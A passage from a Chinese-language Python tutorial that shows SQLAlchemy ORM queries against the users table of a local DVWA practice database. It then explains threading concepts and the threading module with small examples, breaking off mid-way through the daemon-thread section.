<span style="color: #a0522d;">engine</span> = create_engine(<span style="color: #8b2252;">"mysql+pymysql://root:@localhost:33060/dvwa"</span>, echo=<span style="color: #008b8b;">True</span>)
</pre>
</div>

<p>
create_engine("数据库类型+数据库驱动://数据库用户名:数据库密码@IP地址:端口/数据库"，其他参数)<br>
</p>

<p>
这 echo=True 参数表示连接发出的 SQL 将 被记录到标准输出。<br>
</p>

<p>
根据dvwa users 表的内容，写orm model<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; desc users;
+--------------+-------------+------+-----+-------------------+-----------------------------+
| Field        | Type        | Null | Key | Default           | Extra                       |
+--------------+-------------+------+-----+-------------------+-----------------------------+
| user_id      | int(6)      | NO   | PRI | 0                 |                             |
| first_name   | varchar(15) | YES  |     | NULL              |                             |
| last_name    | varchar(15) | YES  |     | NULL              |                             |
| user         | varchar(15) | YES  |     | NULL              |                             |
| password     | varchar(32) | YES  |     | NULL              |                             |
| avatar       | varchar(70) | YES  |     | NULL              |                             |
| last_login   | timestamp   | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| failed_login | int(3)      | YES  |     | NULL              |                             |
+--------------+-------------+------+-----+-------------------+-----------------------------+
8 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select user_id,user,password from users;
+---------+---------+----------------------------------+
| user_id | user    | password                         |
+---------+---------+----------------------------------+
|       1 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
|       2 | gordonb | e99a18c428cb38d5f260853678922e03 |
|       3 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
|       4 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
|       5 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+---------+----------------------------------+
5 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)
</pre>
</div>

<p>
conn/dvwa_model.py<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> Column
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> Integer
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> String
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> TIMESTAMP
<span style="color: #a020f0;">from</span> sqlalchemy.orm <span style="color: #a020f0;">import</span> declarative_base

<span style="color: #a0522d;">Base</span> = declarative_base()

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Users</span>(Base):
  <span style="color: #a0522d;">__tablename__</span> = <span style="color: #8b2252;">"users"</span>
  <span style="color: #a0522d;">user_id</span> = Column(Integer, primary_key=<span style="color: #008b8b;">True</span>, nullable=<span style="color: #008b8b;">False</span>)
  <span style="color: #a0522d;">first_name</span> = Column(String(15), nullable=<span style="color: #008b8b;">True</span>)
  <span style="color: #a0522d;">last_name</span> = Column(String(15), nullable=<span style="color: #008b8b;">True</span>)
  <span style="color: #a0522d;">user</span> = Column(String(15), nullable=<span style="color: #008b8b;">True</span>)
  <span style="color: #a0522d;">password</span> = Column(String(32), nullable=<span style="color: #008b8b;">True</span>)
  <span style="color: #a0522d;">avatar</span> = Column(String(70), nullable=<span style="color: #008b8b;">True</span>)
  <span style="color: #a0522d;">last_login</span> = Column(TIMESTAMP(<span style="color: #008b8b;">True</span>), nullable=<span style="color: #008b8b;">False</span>)
  <span style="color: #a0522d;">failed_login</span> = Column(Integer, nullable=<span style="color: #008b8b;">True</span>)
</pre>
</div>

<p>
<b>使用ORM框架写查询逻辑</b><br>
</p>

<p>
sqlalchemy_test.py<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> conn.connect <span style="color: #a020f0;">import</span> engine
<span style="color: #a020f0;">from</span> sqlalchemy.orm <span style="color: #a020f0;">import</span> Session
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> select
<span style="color: #a020f0;">from</span> dvwa_model <span style="color: #a020f0;">import</span> Users

<span style="color: #a0522d;">session</span> = Session(engine)

<span style="color: #a0522d;">stmt</span> = select(Users)

<span style="color: #b22222;"># </span><span style="color: #b22222;">session.scalars &#36820;&#22238;&#21487;&#36941;&#21382;&#23545;&#35937;</span>
<span style="color: #a020f0;">for</span> user <span style="color: #a020f0;">in</span> session.scalars(stmt):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"user id:%s name:%s"</span> % (user.user_id, user.first_name))
session.close()
</pre>
</div>

<p>
<b>使用ORM框架插入数据</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> conn.connect <span style="color: #a020f0;">import</span> engine
<span style="color: #a020f0;">from</span> sqlalchemy.orm <span style="color: #a020f0;">import</span> Session
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> select
<span style="color: #a020f0;">from</span> dvwa_model <span style="color: #a020f0;">import</span> Users
<span style="color: #a0522d;">session</span> = Session(engine)
session.add(Users(user_id=6, first_name=<span style="color: #8b2252;">"cici"</span>, last_name=<span style="color: #8b2252;">".com"</span>, user=<span style="color: #8b2252;">"m"</span>))
session.commit()
session.close()
</pre>
</div>

<p>
<b>使用ORM框架更新数据</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> conn.connect <span style="color: #a020f0;">import</span> engine
<span style="color: #a020f0;">from</span> sqlalchemy.orm <span style="color: #a020f0;">import</span> Session
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> select
<span style="color: #a020f0;">from</span> dvwa_model <span style="color: #a020f0;">import</span> Users
<span style="color: #a0522d;">session</span> = Session(engine)
<span style="color: #a0522d;">stmt</span> = select(Users).where(Users.user_id == 6)
<span style="color: #a0522d;">data</span> = session.scalars(stmt).one()
data.<span style="color: #a0522d;">user</span> = <span style="color: #8b2252;">'cici'</span>
session.commit()
session.close()
</pre>
</div>

<p>
<b>使用ORM框架删除数据</b><br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> conn.connect <span style="color: #a020f0;">import</span> engine
<span style="color: #a020f0;">from</span> sqlalchemy.orm <span style="color: #a020f0;">import</span> Session
<span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> select
<span style="color: #a020f0;">from</span> dvwa_model <span style="color: #a020f0;">import</span> Users

<span style="color: #a0522d;">session</span> = Session(engine)

<span style="color: #a0522d;">stmt</span> = select(Users).where(Users.user_id == 6)
<span style="color: #a0522d;">data</span> = session.scalars(stmt).one()
session.delete(data)
session.commit()
session.close()
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:960c6d0c-849f-46cf-b70a-d7d916215b1f" class="outline-3">
<h3 id="h:960c6d0c-849f-46cf-b70a-d7d916215b1f">Python多线程与多进程</h3>
<div class="outline-text-3" id="text-h:960c6d0c-849f-46cf-b70a-d7d916215b1f">
</div>
<div id="outline-container-h:91e0effe-433f-43d3-8667-8efb5bffab07" class="outline-4">
<h4 id="h:91e0effe-433f-43d3-8667-8efb5bffab07">进程和线程</h4>
<div class="outline-text-4" id="text-h:91e0effe-433f-43d3-8667-8efb5bffab07">
<p>
进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。<br>
</p>

<p>
进程和程序的关系：程序是源代码编译后的文件，而这些文件存放在磁盘上。当程序被操作系统加载到内存中，就是进程，进程中存放着指令和数据（资源）。一个程序的执行实例就是一个进程。它也是线程的容器。<br>
</p>

<p>
Linux进程有父进程、子进程，Windows的进程是平等关系。<br>
</p>

<p>
在实现了线程的操作系统中，线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。<br>
</p>

<p>
线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。<br>
一个标准的线程由线程ID，当前指令指针(PC）、寄存器集合和堆、栈组成。<br>
</p>

<p>
在许多系统中，创建一个线程比创建一个进程快10-100倍。<br>
</p>

<p>
<b>进程、线程的理解</b><br>
</p>

<p>
现代操作系统提出进程的概念，每一个进程都认为自己独占所有的计算机硬件资源。<br>
进程就是独立的王国，进程间不可以随便的共享数据。<br>
线程就是省份，同一个进程内的线程可以共享进程的资源，每一个线程拥有自己独立的堆栈。<br>
</p>

<p>
<b>线程的状态</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#29366;&#24577; &#21547;&#20041;
<span style="color: #0000ff;">&#23601;&#32490;</span>(Ready): &#32447;&#31243;&#33021;&#22815;&#36816;&#34892;&#65292;&#20294;&#22312;&#31561;&#24453;&#34987;&#35843;&#24230;&#12290;&#21487;&#33021;&#32447;&#31243;&#21018;&#21018;&#21019;&#24314;&#21551;&#21160;&#65292;&#25110;&#21018;&#21018;&#20174;&#38459;&#22622;&#20013;&#24674;&#22797;&#65292;&#25110;&#32773;&#34987;&#20854;&#20182;&#32447;&#31243;&#25250;&#21344;

<span style="color: #0000ff;">&#36816;&#34892;</span>(Running): &#32447;&#31243;&#27491;&#22312;&#36816;&#34892;

<span style="color: #0000ff;">&#38459;&#22622;</span>(Blocked): &#32447;&#31243;&#31561;&#24453;&#22806;&#37096;&#20107;&#20214;&#21457;&#29983;&#32780;&#26080;&#27861;&#36816;&#34892;&#65292;&#22914;I/O&#25805;&#20316;

<span style="color: #0000ff;">&#32456;&#27490;</span>(Terminated): &#32447;&#31243;&#23436;&#25104;&#65292;&#25110;&#36864;&#20986;&#65292;&#25110;&#34987;&#21462;&#28040;
</pre>
</div>

<p>
<b>Python中的进程和线程</b><br>
</p>

<p>
运行程序会启动一个解释器进程，线程共享一个解释器进程。<br>
</p>
</div>
</div>
<div id="outline-container-h:02eda3bd-233c-4a23-bc26-314c267b95bf" class="outline-4">
<h4 id="h:02eda3bd-233c-4a23-bc26-314c267b95bf">Python的线程开发</h4>
<div class="outline-text-4" id="text-h:02eda3bd-233c-4a23-bc26-314c267b95bf">
<p>
Python的线程开发使用标准库threading。<br>
</p>

<p>
进程靠线程执行代码，至少有一个主线程，其它线程是工作线程。主线程是第一个启动的线程，由解释器创建。<br>
</p>

<p>
父线程：如果线程A中启动了一个线程B，A就是B的父线程。<br>
子线程：B就是A的子线程。<br>
</p>
</div>
<div id="outline-container-h:8d17ff66-4176-44ab-b52e-08ea51acf036" class="outline-5">
<h5 id="h:8d17ff66-4176-44ab-b52e-08ea51acf036">Thread类</h5>
<div class="outline-text-5" id="text-h:8d17ff66-4176-44ab-b52e-08ea51acf036">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#31614;&#21517;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, group=<span style="color: #008b8b;">None</span>, target=<span style="color: #008b8b;">None</span>, name=<span style="color: #008b8b;">None</span>,
             args=(), kwargs=<span style="color: #008b8b;">None</span>, *, daemon=<span style="color: #008b8b;">None</span>)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&#21442;&#25968;&#21517; &#21547;&#20041;
target &#32447;&#31243;&#35843;&#29992;&#30340;&#23545;&#35937;&#65292;&#23601;&#26159;&#30446;&#26631;&#20989;&#25968;
name &#20026;&#32447;&#31243;&#36215;&#20010;&#21517;&#23383;
args &#20026;&#30446;&#26631;&#20989;&#25968;&#20256;&#36882;&#23454;&#21442;&#65292;&#20803;&#32452;
kwargs &#20026;&#30446;&#26631;&#20989;&#25968;&#20851;&#38190;&#23383;&#20256;&#21442;&#65292;&#23383;&#20856;
</pre>
</div>

<p>
group必须为None，保留，留给未来实现线程组。截止3.8还未实现。<br>
</p>

<p>
<b>线程启动</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26368;&#31616;&#21333;&#30340;&#32447;&#31243;&#31243;&#24207;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"I'm working"</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Fineshed'</span>)
<span style="color: #a0522d;">t</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>
</pre>
</div>

<p>
通过threading.Thread创建一个线程对象，target是目标函数，可以使用name为线程指定名称。但是线程没有启动，需要调用start方法。<br>
</p>

<p>
线程之所以执行函数，是因为线程中就是要执行代码的，而最简单的代码封装就是函数，所以还是函数调用。<br>
函数执行完，线程也就退出了。<br>
</p>

<p>
那么，如果不让线程退出，或者让线程一直工作怎么办呢？<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
  <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>: <span style="color: #b22222;"># </span><span style="color: #b22222;">for i in range(10):</span>
    time.sleep(0.5)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"I'm working"</span>)
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Fineshed'</span>)

<span style="color: #a0522d;">t</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27880;&#24847;&#30475;&#36825;&#34892;&#31561;&#21495;&#20160;&#20040;&#26102;&#20505;&#25171;&#21360;&#30340;&#65311;</span>
</pre>
</div>

<p>
<b>线程退出</b><br>
</p>

<p>
Python没有提供线程退出的方法，线程在下面情况时退出<br>
1、线程函数内语句执行完毕<br>
2、线程函数中抛出未处理的异常<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(10):
        time.sleep(0.5)
        <span style="color: #a020f0;">if</span> i &gt; 5:
            <span style="color: #b22222;">#</span><span style="color: #b22222;">break # &#32456;&#27490;&#24490;&#29615;</span>
            <span style="color: #b22222;">#</span><span style="color: #b22222;">return # &#20989;&#25968;&#36820;&#22238;</span>
            <span style="color: #a020f0;">raise</span> <span style="color: #228b22;">RuntimeError</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25243;&#24322;&#24120;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'I am working'</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>)

<span style="color: #a0522d;">t</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>)
t.start()
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30)
</pre>
</div>

<p>
Python的线程没有优先级、没有线程组的概念，也不能被销毁、停止、挂起，那也就没有恢复、中断了。<br>
</p>

<p>
<b>线程的传参</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(x, y):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} + {} = {} {}'</span>.<span style="color: #483d8b;">format</span>(x, y, x + y, threading.current_thread().ident)) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#32447;&#31243;id</span>

<span style="color: #a0522d;">t1</span> = threading.Thread(target=add, name=<span style="color: #8b2252;">'add'</span>, args=(4, 5))
t1.start()
time.sleep(2)

<span style="color: #a0522d;">t2</span> = threading.Thread(target=add, name=<span style="color: #8b2252;">'add'</span>, args=(6,), kwargs={<span style="color: #8b2252;">'y'</span>:7})
t2.start()
time.sleep(2)

<span style="color: #a0522d;">t3</span> = threading.Thread(target=add, name=<span style="color: #8b2252;">'add'</span>, kwargs={<span style="color: #8b2252;">'x'</span>:8, <span style="color: #8b2252;">'y'</span>:9})
t3.start()
</pre>
</div>

<p>
线程传参和函数传参没什么区别，本质上就是函数传参。<br>
</p>


<p>
<b>threading的属性和方法</b><br>
</p>


<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#21547;&#20041;
<span style="color: #0000ff;">current_thread</span>() &#36820;&#22238;&#24403;&#21069;&#32447;&#31243;&#23545;&#35937;
<span style="color: #0000ff;">main_thread</span>() &#36820;&#22238;&#20027;&#32447;&#31243;&#23545;&#35937;
<span style="color: #0000ff;">active_count</span>() &#24403;&#21069;&#22788;&#20110;alive&#29366;&#24577;&#30340;&#32447;&#31243;&#20010;&#25968;
<span style="color: #0000ff;">enumerate</span>() &#36820;&#22238;&#25152;&#26377;&#27963;&#30528;&#30340;&#32447;&#31243;&#30340;&#21015;&#34920;&#65292;&#19981;&#21253;&#25324;&#24050;&#32463;&#32456;&#27490;&#30340;&#32447;&#31243;&#21644;&#26410;&#24320;&#22987;&#30340;&#32447;&#31243;
<span style="color: #0000ff;">get_ident</span>() &#36820;&#22238;&#24403;&#21069;&#32447;&#31243;&#30340;ID&#65292;&#38750;0&#25972;&#25968;
</pre>
</div>

<p>
active_count、enumerate方法返回的值还包括主线程。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">showtreadinfo</span>():
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'current thread = {}</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">main thread = {}</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">active count = {}'</span>.<span style="color: #483d8b;">format</span>(
        threading.current_thread(), threading.main_thread(), threading.active_count()
    ))

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
    showtreadinfo()
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(5):
        time.sleep(1)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'i am working'</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>)

<span style="color: #a0522d;">t</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
showtreadinfo()
time.sleep(1)
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'===end==='</span>)
</pre>
</div>

<p>
<b>Thread实例的属性和方法</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#21547;&#20041;
name &#21482;&#26159;&#19968;&#20010;&#21517;&#23383;&#65292;&#21482;&#26159;&#20010;&#26631;&#35782;&#65292;&#21517;&#31216;&#21487;&#20197;&#37325;&#21517;&#12290;getName()&#12289;setName()&#33719;&#21462;&#12289;&#35774;&#32622;&#36825;&#20010;&#21517;&#35789;

ident &#32447;&#31243;ID&#65292;&#23427;&#26159;&#38750;0&#25972;&#25968;&#12290;&#32447;&#31243;&#21551;&#21160;&#21518;&#25165;&#20250;&#26377;ID&#65292;&#21542;&#21017;&#20026;None&#12290;&#32447;&#31243;&#36864;&#20986;&#65292;&#27492;ID&#20381;&#26087;&#21487;&#20197;&#35775;&#38382;&#12290;&#27492;ID&#21487;&#20197;&#37325;&#22797;&#20351;&#29992;

<span style="color: #0000ff;">is_alive</span>() &#36820;&#22238;&#32447;&#31243;&#26159;&#21542;&#27963;&#30528;
</pre>
</div>

<p>
注意：线程的name这是一个名称，可以重复；ID必须唯一，但可以在线程退出后再利用。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(5):
        time.sleep(1)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'i am working'</span>)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>)

<span style="color: #a0522d;">t</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
<span style="color: #483d8b;">print</span>(t.name, t.ident)
time.sleep(1)
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'===end==='</span>)

<span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    time.sleep(1)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} {} {}'</span>.<span style="color: #483d8b;">format</span>(t.name, t.ident,
                            <span style="color: #8b2252;">'alive'</span> <span style="color: #a020f0;">if</span> t.is_alive() <span style="color: #a020f0;">else</span> <span style="color: #8b2252;">'dead'</span>))
    <span style="color: #a020f0;">if</span> <span style="color: #a020f0;">not</span> t.is_alive():
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'{} restart'</span>.<span style="color: #483d8b;">format</span>(t.name))
        t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#37325;&#21551;&#65311;&#65311;</span>
</pre>
</div>

<p>
<b>start和run方法</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(5):
    time.sleep(1)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'I am working'</span>)
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>)

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">MyThread</span>(threading.Thread):
  <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start</span>(<span style="color: #a020f0;">self</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'start~~~~'</span>)
    <span style="color: #483d8b;">super</span>().start()
  <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run</span>(<span style="color: #a020f0;">self</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'run~~~~~~'</span>)
    <span style="color: #483d8b;">super</span>().run()

<span style="color: #a0522d;">t</span> = MyThread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>
t.start()
<span style="color: #b22222;"># </span><span style="color: #b22222;">t.run() # &#25110;&#35843;&#29992;run&#26041;&#27861;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">t.run()</span>
</pre>
</div>

<p>
尝试start两次，或run两次都失败了，但是它们抛出的异常不一样。<br>
</p>

<p>
但是单独运行start或者run都可以，是否可以不需要start方法了吗？在worker中打印线程名称、id。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>():
    <span style="color: #a0522d;">t</span> = threading.current_thread()
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(5):
        time.sleep(1)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'I am working'</span>, t.name, t.ident)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>)

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">MyThread</span>(threading.Thread):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'start~~~~'</span>)
        <span style="color: #483d8b;">super</span>().start()

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'run~~~~~~'</span>)
        <span style="color: #483d8b;">super</span>().run()


<span style="color: #a0522d;">t</span> = MyThread(target=worker, name=<span style="color: #8b2252;">'worker'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32447;&#31243;&#23545;&#35937;</span>
t.start() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>
</pre>
</div>

<p>
start方法才能启动操作系统线程，并运行run方法。run方法内部调用了目标函数。<br>
</p>
</div>
</div>
<div id="outline-container-h:36fc81d4-2961-4894-a140-99003adf3f3f" class="outline-5">
<h5 id="h:36fc81d4-2961-4894-a140-99003adf3f3f">多线程</h5>
<div class="outline-text-5" id="text-h:36fc81d4-2961-4894-a140-99003adf3f3f">
<p>
顾名思义，多个线程，一个进程中如果有多个线程运行，就是多线程，实现一种并发。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> sys

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">worker</span>(f=sys.stdout):
  <span style="color: #a0522d;">t</span> = threading.current_thread()
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(5):
    time.sleep(1)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'i am working'</span>, t.name, t.ident, <span style="color: #483d8b;">file</span>=f)
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'finished'</span>, <span style="color: #483d8b;">file</span>=f)

<span style="color: #a0522d;">t1</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker1'</span>)
<span style="color: #a0522d;">t2</span> = threading.Thread(target=worker, name=<span style="color: #8b2252;">'worker2'</span>, args=(sys.stderr,))
t1.start()
t2.start()
</pre>
</div>

<p>
可以看到worker1和work2交替执行。<br>
</p>

<p>
当使用start方法启动线程后，进程内有多个活动的线程并行的工作，就是多线程。<br>
</p>

<p>
一个进程中至少有一个线程，并作为程序的入口，这个线程就是主线程。<br>
一个进程至少有一个主线程。<br>
其他线程称为工作线程。<br>
</p>
</div>
</div>
<div id="outline-container-h:6cc292f0-df5e-472b-96a4-25482f75fdcf" class="outline-5">
<h5 id="h:6cc292f0-df5e-472b-96a4-25482f75fdcf">线程安全</h5>
<div class="outline-text-5" id="text-h:6cc292f0-df5e-472b-96a4-25482f75fdcf">
<p>
多线程执行一段代码，不会产生不确定的结果，那这段代码就是线程安全的。<br>
</p>

<p>
多线程在运行过程中，由于共享同一进程中的数据，多线程并发使用同一个数据，那么数据就有可能被相互修改，从而导致某些时刻无法确定这个数据的值，最终随着多线程运行，运行结果不可预期，这就是线程不安全。<br>
</p>
</div>
</div>
<div id="outline-container-h:8a9ee09f-fe85-4359-810b-f81262f6ea8b" class="outline-5">
<h5 id="h:8a9ee09f-fe85-4359-810b-f81262f6ea8b">daemon线程</h5>
<div class="outline-text-5" id="text-h:8a9ee09f-fe85-4359-810b-f81262f6ea8b">
<p>
注：有人翻译成后台线程，也有人翻译成守护线程。<br>
</p>

<p>
Python中，构造线程的时候，可以设置daemon属性，这个属性必须在start方法前设置好。<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#28304;&#30721;Thread&#30340;__init__&#26041;&#27861;&#20013;</span>
<span style="color: #a020f0;">if</span> daemon <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
  <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">_daemonic</span> = daemon <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#25143;&#35774;&#23450;bool&#20540;</span>
<span style="color: #a020f0;">else</span>:
  <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">_daemonic</span> = current_thread().daemon
</pre>
</div>

<p>
线程daemon属性，取用户设置的值，否则就取当前线程（父线程）的daemon值。<br>
</p>

<p>
主线程是non-daemon线程，即daemon = False。<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">_MainThread</span>(Thread):
  <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>):
    Thread.__init__(<span style="color: #a020f0;">self</span>, name=<span style="color: #8b2252;">"MainThread"</span>, daemon=<span style="color: #008b8b;">False</span>)
</pre>
</div>

<p>
这说明，daemon如果不设置取父线程的daemon值。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> threading

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">foo</span>():
    time.sleep(5)
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(20):
        <span style="color: #483d8b;">print</span>(i)

